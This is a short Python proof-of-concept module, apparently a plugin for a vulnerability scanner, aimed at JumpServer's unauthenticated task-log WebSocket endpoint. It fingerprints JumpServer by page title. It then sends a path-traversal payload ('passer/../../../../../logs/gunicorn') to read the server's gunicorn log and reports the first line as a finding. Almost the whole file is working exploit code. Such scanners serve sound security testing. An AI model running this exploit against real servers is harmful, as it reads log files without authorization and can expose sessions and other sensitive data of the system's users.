# -*- coding:utf-8 -*-
# JumpServer 日志接口未授权

from .. import requestUtil
from ServiceScanModel.models import ServiceScan
import json
import sys
import time
import asyncio
import websockets
import re
from ws4py.client.threadedclient import WebSocketClient

class ws_long(WebSocketClient):
    result = ""

    def opened(self):
        req = '{"task":"passer/../../../../../logs/gunicorn"}'
        self.send(req)

    def closed(self, code, reason=None):
        print("Closed down:", code, reason)

    def received_message(self, resp):
        resp = json.loads(str(resp))
        # print(resp)
        data = resp['message']
        self.close()
        self.result = data
        return data

    def get_results(self):
        return self.result

def POC_1(target_url):
    try:
        ws = target_url.strip("http://")
        try:
            ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws))
            ws.connect()
            ws.run_forever()
            return ws.get_results()
        except KeyboardInterrupt:
            ws.close()
    except Exception as e:
        print(e)
        return False

def fingerprint(service):
    try:
        if "jumpserver" in service.title.lower() :
            return True
    except:
        return False

def poc(service: ServiceScan):
    try:
        result = POC_1(service.url)
        print(service.url)
        if result:
            return ["JumpServer 日志接口未授权", "最近记录：<br>"+result.split("\n")[0]]
    except:
        return []